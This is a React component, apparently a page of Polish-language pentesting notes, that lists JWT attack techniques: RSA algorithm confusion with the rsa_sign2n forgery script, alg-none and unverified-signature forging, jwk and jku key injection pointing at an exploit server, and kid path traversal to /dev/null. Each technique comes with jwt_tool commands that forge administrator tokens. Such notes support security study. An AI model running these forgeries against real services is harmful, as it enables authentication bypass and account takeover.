import ExampleFrame from "../../exampleFrame/ExampleFrame";
import authentication_hash from '../../../assets/authentication_hash.png';
import authentication_rsa_sign2n from '../../../assets/authentication_rsa_sign2n.png';
import authentication_public_key from '../../../assets/authentication_public_key.png';
import authentication_create from '../../../assets/authentication_create.png';
import jwt_01 from '../../../assets/jwt_01.png';
import jwt_02 from '../../../assets/jwt_02.png';
import jwt_03 from '../../../assets/jwt_03.png';
import jwt_04 from '../../../assets/jwt_04.png';
import { Link } from 'react-router-dom';

const JWT = () =>{
    return(
        <section>
            <h1>JWT</h1>

            <details>
                <summary>JWT - Zamieszanie algorytmiczne</summary>
                <ExampleFrame screen={authentication_hash}/>
                <Link to='https://github.com/FilipowiczP/rsa_sign2n'>JWT rsa_sign2n</Link>
                <div className='waring'>
                    <p>git clone https://github.com/FilipowiczP/rsa_sign2n</p>
                    <p>cd rsa_sign2n/standalone/</p>
                    <p>docker build . -t sig2n</p>
                    <p>docker run -it sig2n /bin/bash</p>
                    <p>python3 jwt_forgery.py {`<Token_1>`}  {`<Token_2>`}</p>
                </div>
                <ExampleFrame screen={authentication_rsa_sign2n} />
                <p>cat {`<Wygenerowany plik.pem>`}</p>
                <ExampleFrame screen={authentication_public_key} />
                <p>Skopiowanie klucza i przerobienie (PAMIĘTAĆ! - ustawić odpowiedne szyfrowanie HS256)</p>
                <ExampleFrame screen={authentication_create} />
            </details>

            <hr />

            <details>
                <summary>Akceptowanie dowolnych podpisów</summary>
                
                <div className="waring">
                    <p>jwt_tool {`<JWT>`} -I -pc sub -pv administrator</p>
                </div>
            </details>

            <hr />

            <details>
                <summary>Akceptowanie tokenów bez podpisu</summary>
                
                <div className="waring">
                    <p>jwt_tool {`<JWT>`} -X a -I -pc sub -pv administrator</p>
                </div>

                <ExampleFrame screen={jwt_01} />
            </details>

            <hr />

            <details>
                <summary>Wstrzykiwanie samopodpisanych tokenów JWT za pomocą parametru jwk</summary>
                
                <div className="waring">
                    <p>jwt_tool {`<JWT>`} -X i</p>
                </div>

                <ExampleFrame screen={jwt_02} />

                <div className="waring">
                    <p>jwt_tool {`<JWT>`} -I -pc sub -pv administrator -hc kid -hv jwt_tool</p>
                </div>
                <p><span className="important">Można również zmienić wartośći za pomocą flag -X i -T</span></p>
            </details>

            <hr />

            <details>
                <summary>Wstrzykiwanie samopodpisanych tokenów JWT za pomocą parametru jku</summary>
                
                <div className="waring">
                    <p>jwt_tool {`<JWT>`} -X s -ju {`<EXPLOIT SERVER>`} -T</p>
                    <br />
                    <p><span className="important">kid = jwt_tool</span></p>
                    <br />
                    <p><span className="important">sub = administrator</span></p>
                    <ExampleFrame screen={jwt_03} />
                    <p><span className="important">Zawartość pliku umieszczamy na serwerze</span></p>
                </div>

                <p>Rezultat</p>
                <ExampleFrame screen={jwt_04} />
            </details>

            <hr />

            <details>
                <summary>Wstrzykiwanie samopodpisanych tokenów JWT za pomocą parametru kid/ path traversal</summary>
                
                <div className="waring">
                    <p>jwt_tool {`<JWT>`} -I hc kid -hv '../../../../../dev/null' -pc sub -pv administrator -S hs256 -p ''</p>
                </div>

            </details>
        </section>
    )
}

export default JWT;